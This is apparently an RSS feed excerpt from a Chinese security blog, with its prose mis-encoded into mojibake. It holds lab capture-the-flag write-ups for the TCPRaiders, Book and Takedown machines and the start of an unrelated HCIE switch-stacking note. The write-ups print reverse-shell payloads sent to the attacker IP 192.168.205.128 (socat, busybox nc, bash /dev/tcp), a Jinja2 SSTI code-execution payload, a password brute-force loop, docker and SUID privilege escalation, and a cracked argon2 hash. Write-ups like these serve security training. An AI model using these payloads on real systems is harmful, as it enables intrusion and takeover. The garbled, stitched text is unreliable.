ËøôÊòéÊòæÊòØ‰∏Ä‰∏™ÂØÜÁ†ÅÈ™åËØÅÁ®ãÂ∫è„ÄÇÁ®ãÂ∫èÈÄªËæëÂèØËÉΩÊòØÂ∞ÜÁî®Êà∑ËæìÂÖ•‰∏éÊüê‰∏™Ê≠£Á°ÆÂØÜÁ†ÅËøõË°åÊØîËæÉ„ÄÇËÄÉËôëÂà∞ÊèêÁ§∫‰ø°ÊÅØÔºåËØ•Á®ãÂ∫èÂèØËÉΩÂ∞ÜÁî®Êà∑ÁöÑËæìÂÖ•ËøõË°åÂèçÂêëÂ§ÑÁêÜ„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™ÂèçÂêëÁöÑÂ≠óÂÖ∏ËøõË°åÁàÜÁ†¥„ÄÇ

Êàë‰ª¨‰ΩøÁî® `rockyou.txt` Â≠óÂÖ∏ÔºåÂ∞ÜÂÖ∂Êï¥Êú¨ÂèçËΩ¨ÂêéÔºåÈÄöËøáÁÆ°ÈÅìÁ¨¶ÂíåÂæ™ÁéØÊù•ÁàÜÁ†¥ÂØÜÁ†Å„ÄÇ

```bash
# Âú®/tmpÁõÆÂΩïÂáÜÂ§áÂèçËΩ¨ÂêéÁöÑÂ≠óÂÖ∏
cd /tmp
wget http://192.168.205.128/rockyou.txt
rev rockyou.txt &gt; pass

# ÊâßË°åÁàÜÁ†¥ËÑöÊú¨
echo 'hold on...' &amp;&amp; while read p; do echo '$p' | sudo -u luna /usr/sbin/
luna | grep -q tcerrocnI || { echo '[+] Found: $p'; break; }; done &lt; pass
hold on...
/tmp $ 
[+] Found: ebyam
```

ÊàêÂäüÊâæÂà∞ÂØÜÁ†Å‰∏∫ `ebyam`„ÄÇÁé∞Âú®ÔºåÊàë‰ª¨ÊâßË°å `/usr/sbin/luna` Âπ∂ËæìÂÖ•ËØ•ÂØÜÁ†ÅÔºåÊàêÂäüÂàáÊç¢Âà∞ `luna` Áî®Êà∑„ÄÇ

```bash
/opt $ sudo -u luna /usr/sbin/luna
 drowssaP: ebyam
/opt $ id
uid=1001(luna) gid=1001(luna) groups=1001(luna)
```

## **2. luna -&gt; root**

Âú® `luna` Áî®Êà∑ÁöÑshell‰∏≠ÔºåÂÜçÊ¨°ÊâßË°å `sudo -l`„ÄÇ

```bash
/opt $ sudo -l
...
User luna may run the following commands on tcpraiders:
    (ALL) NOPASSWD: /usr/bin/docker build *, /usr/bin/docker run *
```

ÂèëÁé∞ `luna` Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜ‰ª• `root` ÊùÉÈôêÊâßË°å‰ªªÊÑè `docker build` Âíå `docker run` ÂëΩ‰ª§„ÄÇËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÊèêÊùÉË∑ØÂæÑ„ÄÇÁî±‰∫éÈù∂Êú∫ÂèØ‰ª•ËÆøÈóÆÂ§ñÁΩëÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÊãâÂèñ‰∏Ä‰∏™ÈïúÂÉèÊù•Âà©Áî®„ÄÇ

Êàë‰ª¨Âà©Áî® `docker run` ÂëΩ‰ª§ÔºåÂ∞ÜÂÆø‰∏ªÊú∫ÁöÑÊ†πÁõÆÂΩï `/` ÊåÇËΩΩÂà∞ÂÆπÂô®ÁöÑ `/mnt` ÁõÆÂΩïÔºåÁÑ∂ÂêéÂú®ÂÆπÂô®ÂÜÖÊâßË°å `chroot /mnt`Ôºå‰ªéËÄåËé∑ÂæóÂÆø‰∏ªÊú∫ÁöÑ `root` shell„ÄÇ

```bash
/opt $ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
...
Status: Downloaded newer image for alpine:latest
/ # id
uid=0(root) gid=0(root) groups=0(root),...
```

ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôê„ÄÇÊúÄÂêéÔºåËØªÂèñ‰Ωç‰∫éÁî®Êà∑ÁõÆÂΩïÂíå `root` ÁõÆÂΩï‰∏ãÁöÑ flag Êñá‰ª∂„ÄÇ

```bash
/ # cat /root/root.flag /home/luna/user.flag
flag{641d35852cd6fdaab8a6a621d40c3d5ac2b453aa}
flag{1b925e677f649ce856f61e3846466252e75cc179}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_TCPRaiders.html</guid><pubDate>Fri, 15 Aug 2025 13:34:38 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Book</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Book.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè**

È¶ñÂÖàÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Á°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄÔºåÈöèÂêéÂà©Áî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.142 08:00:27:5d:bd:e0       PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 08:53 EDT
Nmap scan report for 192.168.205.142
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 08:00:27:5D:BD:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds```
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.142`ÔºåÂºÄÊîæ‰∫Ü **22 (SSH)**„ÄÅ**80 (HTTP)** Âíå **443 (HTTPS)** Á´ØÂè£„ÄÇËÆøÈóÆ80Á´ØÂè£‰ºöËá™Âä®Ë∑≥ËΩ¨Âà∞443Á´ØÂè£„ÄÇ

## **2. ÊúçÂä°‰æ¶ÂØü**

* **HTTPS (443Á´ØÂè£):** ËÆøÈóÆËØ•ÊúçÂä°ÂèëÁé∞ÊòØ‰∏Ä‰∏™Âü∫‰∫éÂºÄÊ∫êÈ°πÁõÆ `cstimer` ÁöÑÈ≠îÊñπËÆ°Êó∂ÁΩëÁ´ô„ÄÇ

  &gt; [!Tip]
  &gt;
  &gt; https://github.com/cs0x7f/cstimer

  ![image-20250814205523360](C:\Users\ABCDEFG888\AppData\Roaming\Typora\typora-user-images\image-20250814205523360.png)

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂàùÂßãËÆøÈóÆ**

## **1. WebÂèÇÊï∞Ê®°Á≥äÊµãËØï‰∏éRCE**

ÂØπÁΩëÁ´ôËøõË°åÂèÇÊï∞Ê®°Á≥äÊµãËØïÔºåÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `cmd` ÁöÑÂèÇÊï∞Â≠òÂú®ËøúÁ®ã‰ª£Á†ÅÊâßË°åÔºàRCEÔºâÊºèÊ¥û„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://192.168.205.142?FUZZ=id' --fw 3928

...
cmd                     [Status: 200, Size: 55130, Words: 3930, Lines: 359, Duration: 228ms]
...
```

## **2. Ëé∑Âèñ www-data Shell**

ÁªèËøáÊµãËØïÂèëÁé∞ÔºåÁõÆÊ†á‰∏ªÊú∫‰∏äÊ≤°Êúâ `busybox` Âíå `curl`ÔºåÁõ¥Êé•‰ΩøÁî® `bash` ÂèçÂºπshell‰πüÂ§±Ë¥•ÔºàÂèØËÉΩÊòØÊàëÁöÑÈóÆÈ¢òÔºå‰Ω†ÂèØ‰ª•Â∞ùËØï‰∏Ä‰∏ãÔºâ„ÄÇÊúÄÁªàÈÄâÊã©‰ΩøÁî® `socat` Êù•Ëé∑ÂèñÂèçÂºπshell„ÄÇ

**Êú¨Âú∞ÁõëÂê¨:**

```bash
nc -lvnp 8888
```

**ÊâßË°åPayload:**

```bash
# Âà©Áî® socat ÂèçÂºπ shell
https://192.168.205.142/?cmd=socat TCP:192.168.205.128:8888 EXEC:$(which $(echo $0))
```

ÊàêÂäüÊé•Êî∂Âà∞ `www-data` Áî®Êà∑ÁöÑshellÂêéÔºå‰∏∫‰∫Ü‰æø‰∫éÊìç‰ΩúÔºå‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Â∫èÂàóÊù•Ëé∑Âæó‰∏Ä‰∏™ÂäüËÉΩÂÆåÊï¥ÁöÑTTY„ÄÇ

```bash
script /dev/null -c bash
# Êåâ‰∏ã Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. www-data -&gt; room**

Âú® `www-data` shell‰∏≠ÔºåÊü•Áúã `/home` ÁõÆÂΩïÂèëÁé∞Â≠òÂú®Áî®Êà∑ `room`„ÄÇÂ∞ùËØï‰ΩøÁî®Âº±Âè£‰ª§ `room` ËøõË°åÁî®Êà∑ÂàáÊç¢ÔºåÊàêÂäüÂàáÊç¢Âà∞ `room` Áî®Êà∑„ÄÇ

```bash
www-data@Book:/home$ su room 
Password: room
room@Book:/home$ id
uid=1001(room) gid=1001(room) groups=1001(room)
```

## **2. room -&gt; root**

1. **Êú¨Âú∞ÊúçÂä°ÂèëÁé∞:** Êàê‰∏∫ `room` Áî®Êà∑ÂêéÔºå‰ΩøÁî® `ss -tnlp` ÂëΩ‰ª§ÂèëÁé∞Êú¨Âú∞ `127.0.0.1` ÁöÑ `8888` Á´ØÂè£‰∏äËøêË°åÁùÄ‰∏Ä‰∏™ÊúçÂä°„ÄÇ

   ```bash
   room@Book:~$ ss -tnlp
   State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
   ...     
   LISTEN    0         128              127.0.0.1:8888             0.0.0.0:*
   ...
   ```

   ÈÄöËøá `wget` ËÆøÈóÆËØ•ÊúçÂä°ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ Jupyter Server ÁöÑÁôªÂΩïÈ°µÈù¢„ÄÇ

2. **Âá≠ËØÅÂèëÁé∞‰∏éÁ†¥Ëß£:** Âú® `/var/backups/` ÁõÆÂΩï‰∏ãÊâæÂà∞‰∏Ä‰∏™JupyterÁöÑÈÖçÁΩÆÊñá‰ª∂ `jupyter_server_config.json`ÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™ `argon2` Ê†ºÂºèÁöÑÂìàÂ∏åÂØÜÁ†Å„ÄÇ

   ```bash
   room@Book:/var/backups$ cat jupyter_server_config.json
   {
     'IdentityProvider': {
       'hashed_password': 'argon2:$argon2id$v=19$m=10240,t=10,p=8$FLuM1EM1nn/EP9ni1ust1A$BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4'
     }
   }
   ```

   ‰ΩøÁî® `Argon2Cracker` Â∑•ÂÖ∑ÂíåÂ≠óÂÖ∏ÂØπËØ•ÂìàÂ∏åËøõË°åÁ†¥Ëß£ÔºåÊàêÂäüÂæóÂà∞ÊòéÊñáÂØÜÁ†Å `star123`„ÄÇ

   &gt; [!Tip]
   &gt;
   &gt; https://github.com/p0dalirius/Argon2Cracker

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/Argon2Cracker]
   ‚îî‚îÄ$ python3 Argon2Cracker.py '$argon2id$v=19$m=10240,t=10,p=8$FLuM1EM1nn/EP9ni1ust1A$BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4' -w ../5000h.txt  
   ...
   [&gt;] Found: star123
   ```

3. **Ëé∑ÂèñRootÊùÉÈôê:**

   * Âú®Kali‰∏äÔºå‰ΩøÁî®SSHÁöÑÊú¨Âú∞Á´ØÂè£ËΩ¨ÂèëÂäüËÉΩÔºåÂ∞ÜÁõÆÊ†á‰∏ªÊú∫ÁöÑ8888Á´ØÂè£Êò†Â∞ÑÂà∞Êú¨Âú∞„ÄÇ

     ```bash
     ssh -L 8888:127.0.0.1:8888 room@192.168.205.142
     ```

   * ÊâìÂºÄÊú¨Âú∞ÊµèËßàÂô®ËÆøÈóÆ `http://127.0.0.1:8888`ÔºåËøõÂÖ•JupyterÁôªÂΩïÈ°µÈù¢ÔºåËæìÂÖ•Á†¥Ëß£Âá∫ÁöÑÂØÜÁ†Å `star123` ÊàêÂäüÁôªÂΩï„ÄÇ

   * Jupyter ServerÂú®Ê≠§Â§ÑÊòØ‰ª• `root` ÊùÉÈôêËøêË°åÁöÑ„ÄÇÈÄöËøá `File &gt; New &gt; Terminal` ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÁªàÁ´ØÔºåÁõ¥Êé•Ëé∑Âæó `root` ÊùÉÈôêÁöÑshell„ÄÇ

   * ÊúÄÂêéÔºåÂú® `root` shell‰∏≠ËØªÂèñ‰∏§‰∏™flagÊñá‰ª∂„ÄÇ

     ```bash
     root@Book:~# id
     uid=0(root) gid=0(root) groups=0(root)
     root@Book:~# cat /root/root.txt /home/room/user.txt 
     flag{root-4f98663772651c870e911982e991d0d9}
     flag{user-a81e1f271bc4a3dd4ac87827da4d0a78}
     ```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Book.html</guid><pubDate>Thu, 14 Aug 2025 23:48:15 +0000</pubDate></item><item><title>hmv_Takedown</title><link>https://7r1UMPHK.github.io/post/hmv_Takedown.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè**

È¶ñÂÖà‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠Á°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄÔºåÈöèÂêéÂà©Áî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.131 08:00:27:77:f8:3a     PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.131`ÔºåÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** Á´ØÂè£„ÄÇ

## **2. WebÊúçÂä°‰æ¶ÂØü**

ËÆøÈóÆ `http://192.168.205.131`ÔºåÊúçÂä°Âô®ËøîÂõû301ÈáçÂÆöÂêëÔºåÊåáÂêëÂüüÂêç `http://shieldweb.che/`„ÄÇ

Â∞ÜÂüüÂêç‰∏éIPÂú∞ÂùÄÁªëÂÆöÂà∞ `/etc/hosts` Êñá‰ª∂ÂêéÔºåËøõË°åÂ≠êÂüüÂêçÁàÜÁ†¥ÔºåÂèëÁé∞‰∏Ä‰∏™ÈáçË¶ÅÁöÑÂ≠êÂüüÂêç `ticket.shieldweb.che`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo vim /etc/hosts
# Ê∑ªÂä†‰ª•‰∏ãË°å
192.168.205.131 shieldweb.che ticket.shieldweb.che

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ wfuzz -c -u 'http://shieldweb.che' -H 'HOST:FUZZ.shieldweb.che' -w /path/to/wordlist.txt --hw 11
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================
000000453:   200        94 L     180 W      2129 Ch     'ticket - ticket'
...
```

ÂÜçÊ¨°ËÆøÈóÆ `http://ticket.shieldweb.che`ÔºåÂèëÁé∞‰∏Ä‰∏™ËÅîÁ≥ªË°®ÂçïÈ°µÈù¢„ÄÇÁõÆÂΩïÊâ´ÊèèÊòæÁ§∫Â≠òÂú® `/submit` Ë∑ØÂæÑ„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂàùÂßãËÆøÈóÆ**

## **1. SSTI (ÊúçÂä°Âô®Á´ØÊ®°ÊùøÊ≥®ÂÖ•)**

Âú®ËÅîÁ≥ªË°®ÂçïÁöÑ `name` Â≠óÊÆµ‰∏≠ËæìÂÖ• `{{7*7}}` Âπ∂Êèê‰∫§Âà∞ `/submit` Á´ØÁÇπÔºåËøîÂõûÁªìÊûú‰∏≠ÊòæÁ§∫‰∫Ü `49`„ÄÇËøôËØÅÂÆû‰∫ÜËØ•Ë°®ÂçïÂ≠òÂú® **Jinja2 ÊúçÂä°Âô®Á´ØÊ®°ÊùøÊ≥®ÂÖ• (SSTI)** ÊºèÊ¥û„ÄÇ

**ÊºèÊ¥ûÈ™åËØÅ:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://ticket.shieldweb.che/submit -X POST -d 'name={{7*7}}&amp;email=a&amp;message=a'
...
&lt;div class='response success'&gt;
    Thank you for your message, 49!
&lt;/div&gt;
...
```

## **2. SSTI Âà∞ RCE**

Âà©Áî®SSTIÊºèÊ¥ûÔºåÊûÑÈÄ†Payload‰ª•ÊâßË°åËøúÁ®ã‰ª£Á†Å„ÄÇÈÄöËøáÈÅçÂéÜPythonÂØπË±°ÔºåÂèØ‰ª•Ë∞ÉÁî® `os.popen` Êù•ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§„ÄÇ

**ÊâßË°å `id` ÂëΩ‰ª§:**

```bash
# Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://ticket.shieldweb.che/submit -X POST -d 'name=%7B%7B%20self.__init__.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%20%7D%7D&amp;email=1&amp;message=1'
...

&lt;div class='response success'&gt;
    Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
!
&lt;/div&gt;

...
```

ÂëΩ‰ª§ÊàêÂäü‰ª• `root` Áî®Êà∑Ë∫´‰ªΩÂú®‰∏Ä‰∏™ÂÆπÂô®ÂÜÖÊâßË°å„ÄÇ

## **3. Ëé∑ÂèñÂèçÂºπShell (DockerÂÜÖ)**

ÊûÑÈÄ†ÂèçÂºπShellÁöÑPayloadÔºåÂú®Êú¨Âú∞KaliÂºÄÂêØÁõëÂê¨ÔºåÊàêÂäüËé∑Âèñ‰∏Ä‰∏™DockerÂÆπÂô®ÂÜÖÁöÑ `root` ÊùÉÈôêShell„ÄÇ

**Êú¨Âú∞ÁõëÂê¨:**

```bash
nc -lvnp 8888
```

**ÊâßË°åÂèçÂºπShell Payload:**ÔºàÂéªwebÊâßË°åÔºå‰∏çÁÑ∂‰ºöÊúâ**shell Ëß£ÊûêÈóÆÈ¢ò**Ôºâ

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.128 8888 -e $(which $(echo $0)) ').read() }}
```

**Á®≥ÂÆöshellÔºö**

```bash
python -c 'import pty; pty.spawn('ash')'
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=ash
stty rows 24 columns 80
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. ÂÆπÂô®ÈÄÉÈÄ∏ (Docker -&gt; love)**

Âú®Ëé∑ÂæóÁöÑDocker Shell‰∏≠ËøõË°å‰ø°ÊÅØÊî∂ÈõÜÔºåÂèëÁé∞ `/var/log/access.yml` Êñá‰ª∂‰∏≠ËÆ∞ÂΩï‰∫Ü‰∏ÄÊù°ÂèØÁñëÁöÑ `cron` ËÆ°Âàí‰ªªÂä°„ÄÇ

```bash
/var/log # cat access.yml
...
2023-08-31 22:45:00 - Usuario: A.love - Accion: Tarea cron ejecutada: */5 * * * * root bash /home/love/script/*
...
```

ËØ•‰ªªÂä°ÊØè5ÂàÜÈíü‰ª• `root` ÊùÉÈôêÊâßË°å `/home/love/script/` ÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâËÑöÊú¨„ÄÇÈÄöËøá `linpeas.sh` Á≠âÂ∑•ÂÖ∑ÊàñÊâãÂä® `mount` Ê£ÄÊü•ÔºåÂèëÁé∞ÂÆø‰∏ªÊú∫ÁöÑ `/home/love/script` Ë¢´ÊåÇËΩΩÂà∞‰∫ÜÂÆπÂô®ÁöÑ `/script` ÁõÆÂΩïÔºåÂπ∂‰∏îËØ•ÁõÆÂΩïÂèØÂÜô„ÄÇËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÂÆπÂô®ÈÄÉÈÄ∏Ë∑ØÂæÑ„ÄÇ

1. Âú®ÂÆπÂô®ÁöÑ `/script` ÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™ÂèçÂºπShellËÑöÊú¨„ÄÇ

   ```bash
   /script # echo 'bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'' &gt; 
   a.sh
   /script # chmod +x a.sh 
   ```

2. Âú®Êú¨Âú∞KaliÂºÄÂêØ `8888` Á´ØÂè£ÁõëÂê¨„ÄÇÁ≠âÂæÖcron‰ªªÂä°ÊâßË°åÂêéÔºåÊàêÂäüÊé•Êî∂Âà∞ÂÆø‰∏ªÊú∫ `love` Áî®Êà∑ÁöÑShell„ÄÇ

## **2. love -&gt; mitnick**

Âú® `love` Áî®Êà∑ÁöÑShell‰∏≠ÔºåÊâßË°å `sudo -l` ÂèëÁé∞ÂÖ∂ÂèØ‰ª•ÂÖçÂØÜ‰ª• `mitnick` Áî®Êà∑Ë∫´‰ªΩËøêË°å‰∏Ä‰∏™Âêç‰∏∫ `sas` ÁöÑÁ®ãÂ∫è„ÄÇ

```bash
love@osiris:~$ sudo -l
...
User love may run the following commands on osiris:
    (mitnick) NOPASSWD: /home/mitnick/sas
```

ËøêË°å `/home/mitnick/sas` ÂêéËøõÂÖ•‰∏Ä‰∏™ÂèóÈôêÁöÑËá™ÂÆö‰πâshell„ÄÇËØ•shellÂÜÖÁΩÆ‰∫Ü `run` ÂëΩ‰ª§ÔºåÂèØ‰ª•ÊâßË°åÂ§ñÈÉ®ËÑöÊú¨„ÄÇ

1. Âú® `/tmp` ÁõÆÂΩïÂàõÂª∫‰∏Ä‰∏™ËÑöÊú¨ÔºåÁî®‰∫éÂ§çÂà∂ `/bin/bash` Âπ∂‰∏∫ÂÖ∂Ëµã‰∫àSUIDÊùÉÈôê„ÄÇ

   ```bash
   love@osiris:/tmp$ echo 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh' &gt; a.sh
   love@osiris:/tmp$ chmod +x a.sh
   ```

2. ÈÄöËøá `sas` shellÊâßË°åËØ•ËÑöÊú¨„ÄÇ

   ```bash
   love@osiris:~$ sudo -u mitnick /home/mitnick/sas
   # run /tmp/a.sh
   ```

3. ÊâßË°å `/tmp/sh -p`ÔºåÊàêÂäüËé∑Âæó `mitnick` Áî®Êà∑ÁöÑÊúâÊïàÊùÉÈôê„ÄÇ

## **3. mitnick -&gt; tomu**

Âú® `mitnick` Áî®Êà∑ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÔºåÂèëÁé∞‰∏Ä‰∏™ÂÖ¨Èí•Êñá‰ª∂ `publickey.pub` Âíå‰∏Ä‰∏™Âä†ÂØÜÊñá‰ª∂ `secret.enc`„ÄÇÈÄöËøáÊü•Áúã`publickey.pub`ÂèØ‰ª•ÂèëÁé∞ËøôÊòØ‰∏Ä‰∏™ÈùûÂ∏∏Áü≠ÁöÑ RSA ÂÖ¨Èí•ÔºåÈïøÂ∫¶Âè™Êúâ **512 ‰Ωç**ÔºåËøôÊÑèÂë≥ÁùÄ**ÂèØ‰ª•Áî® RSA Âõ†Êï∞ÂàÜËß£ÊîªÂáªÁõ¥Êé•ÁàÜÁ†¥ÁßÅÈí•**„ÄÇ

1. Â∞ÜËøô‰∏§‰∏™Êñá‰ª∂‰º†ËæìÂà∞Êú¨Âú∞KaliÊîªÂáªÊú∫„ÄÇ

2. ‰ΩøÁî® `RsaCtfTool` Â∑•ÂÖ∑ÔºåÂà©Áî®ÂÖ¨Èí•Êù•Ëß£ÂØÜÊñá‰ª∂„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
   ‚îî‚îÄ$ RsaCtfTool --publickey publickey.pub --decryptfile secret.enc --private
   ...
   utf-8 : sh1m0mur4Bl4ckh4t
   ...
   ```

3. ÊàêÂäüËß£ÂØÜÂá∫ÂØÜÁ†ÅÔºö`sh1m0mur4Bl4ckh4t`„ÄÇ

4. Âú® `/home` ÁõÆÂΩï‰∏ãÂèëÁé∞Âè¶‰∏ÄÁî®Êà∑ `tomu`„ÄÇ‰ΩøÁî®ÂàöËß£Âá∫ÁöÑÂØÜÁ†ÅÊàêÂäüÂàáÊç¢Âà∞ `tomu` Áî®Êà∑„ÄÇ

## **4. tomu -&gt; root**

Âú® `tomu` Áî®Êà∑ÁöÑShell‰∏≠ÔºåÂÜçÊ¨°ÊâßË°å `sudo -l`ÔºåÂèëÁé∞ÂèØ‰ª•ÂÖçÂØÜ‰ª• `root` Ë∫´‰ªΩËøêË°å `/opt/Contempt/Contempt`„ÄÇ

```bash
tomu@osiris:~$ sudo -l
...
User tomu may run the following commands on osiris:
    (root) /opt/Contempt/Contempt
```

ÊâßË°åËØ•Á®ãÂ∫èÂêéÔºåÂá∫Áé∞‰∏Ä‰∏™ËèúÂçï„ÄÇÈÄâÊã© `2` (Ayuda) ‰ºö‰ΩøÁî® `vim` ÊâìÂºÄÂ∏ÆÂä©ÊñáÊ°£„ÄÇ`vim` Âú®‰ª•`sudo`ÊùÉÈôêËøêË°åÊó∂ÔºåÂèØ‰ª•ÈÄöËøáÂÜÖÈÉ®ÂëΩ‰ª§ÈÄÉÈÄ∏Âà∞shell„ÄÇ

1. ÊâßË°åÊèêÊùÉÂëΩ‰ª§„ÄÇ

   ```bash
   tomu@osiris:~$ sudo /opt/Contempt/Contempt
   ```

2. Âú®Á®ãÂ∫èËèúÂçï‰∏≠ÈÄâÊã© `2`ÔºåËøõÂÖ• `vim` ÁïåÈù¢„ÄÇ

3. Âú® `vim` ÂëΩ‰ª§Ê®°Âºè‰∏ãÔºåËæìÂÖ• `!bash` Êàñ `!sh` Âπ∂ÂõûËΩ¶„ÄÇ

   ```vim
   :!bash
   ```

4. ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôêÁöÑ‰∫§‰∫íÂºèShell„ÄÇ

**ÊúÄÁªàÂú® `/root` Âíå `/home/tomu` ÁõÆÂΩï‰∏ãÊâæÂà∞flag„ÄÇ**

```bash
root@osiris:~# cat /root/root.sh
...
flag --&gt; 1e271c5ce97e76ae8417a95c74085fba
...
root@osiris:~# cat /home/tomu/user.txt
612701a03669485d94bc687449fdab39
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Takedown.html</guid><pubDate>Thu, 14 Aug 2025 01:42:42 +0000</pubDate></item><item><title>HCIE-Q1</title><link>https://7r1UMPHK.github.io/post/HCIE-Q1.html</link><description>![image-20250811083621208](http://7r1UMPHK.github.io/image/20250813214159666.webp)

# 1 ÈÉ®ÁΩ≤ÁΩëÁªúÂèØÈù†ÊÄß

## 1.1 ÈÖçÁΩÆ‰∫§Êç¢Êú∫Â†ÜÂè†

*ps:Â†ÜÂè†enspÂÅö‰∏ç‰∫ÜÔºåÊöÇÊó∂‰∏çÁÆ°*

### X_T2_AGG1-2

ÈáçÂêØ1-2Ôºå‰øùËØÅ1‰∏∫‰∏ª

```
reboot fast
```

### X_T2_AGG1-1

```
stack slot 0 priority 200
int stack-port 0/1
port int X0/0/1 en
shut int X0/0/1
q
int stack-port 0/2
port int X0/0/2 en
shut int X0/0/2
q
```

### X_T2_AGG1-2

```
int stack-port 0/1
port int X0/0/2 en
q
int stack-port 0/2
port int X0/0/1 en
q
q
```

### X_T2_AGG1-1

```
--ÊâìÂºÄX_T2_AGG1-1Â†ÜÂè†‰∫íËÅîÊé•Âè£(Âª∫ËÆÆÁõ¥Êé•Â§çÂà∂)--
int stack-port 0/1
undo shut int X0/0/1
q
int stack-port 0/2
undo shut int X0/0/2
q
----------------------------
sys X_T2_AGG1
dis stack
```

